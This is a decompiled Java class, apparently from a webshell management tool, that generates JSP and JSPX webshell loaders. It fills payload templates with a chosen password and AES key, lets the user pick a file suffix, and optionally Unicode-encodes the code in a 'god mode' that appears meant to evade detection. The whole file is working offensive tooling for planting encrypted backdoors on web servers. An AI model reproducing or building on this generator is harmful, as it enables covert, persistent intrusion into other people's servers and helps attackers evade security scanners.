/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.JavaAes;

import core.ApplicationContext;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = new String[]{"jsp", "jspx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
        byte[] data = null;
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Code.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (suffix.equals(SUFFIX[1])) {
                    globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                    code = code.replace("<", "&lt;").replace(">", "&gt;");
                }
                template = ApplicationContext.isGodMode() ? template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code)) : template.replace("{globalCode}", globalCode).replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    public static byte[] GenerateShellLodermessage(String shellName, String pass, String secretKey, boolean isBin) {
        byte[] data = null;
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCodemessage.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Codemessage.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (suffix.equals(SUFFIX[1])) {
                    globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                    code = code.replace("<", "&lt;").replace(">", "&gt;");
                }
                template = ApplicationContext.isGodMode() ? template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code)) : template.replace("{globalCode}", globalCode).replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    public static byte[] GenerateShellLodermessage(String pass, String secretKey, boolean isBin) {
        return Generate.GenerateShellLodermessage("", pass, secretKey, isBin);
    }
    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        return Generate.GenerateShellLoder("", pass, secretKey, isBin);
    }
}

